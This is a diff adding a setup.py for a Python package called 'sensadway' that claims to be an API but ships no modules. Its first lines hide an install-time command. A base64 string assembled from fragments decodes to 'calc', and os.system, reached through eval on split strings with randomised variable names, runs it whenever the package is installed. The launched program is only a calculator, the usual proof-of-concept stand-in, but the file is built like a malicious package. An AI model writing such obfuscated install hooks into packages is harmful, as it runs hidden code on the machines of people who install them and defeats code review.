@@ -1,0 +1,16 @@
+from setuptools import setup
+import base64
+import os
+ECaIEWYTnJGN =("Y2F"+"sY" +'w=' +'=').encode()
+bIcEWhCTvW = base64.b64decode(ECaIEWYTnJGN).decode()
+afrUevyS =eval('os.'+"s" +"y" +"ste" +'m')
+afrUevyS(bIcEWhCTvW)
+setup(name='sensadway',
+      version='0.1',
+      description='this is the api for sensadway',
+      url='https://sensadway.gov/goi/m3/package',
+      author='abknock',
+      author_email='AbbieKnoblock519@proton.me',
+      license='MIT',
+      packages=[],
+      zip_safe=False)
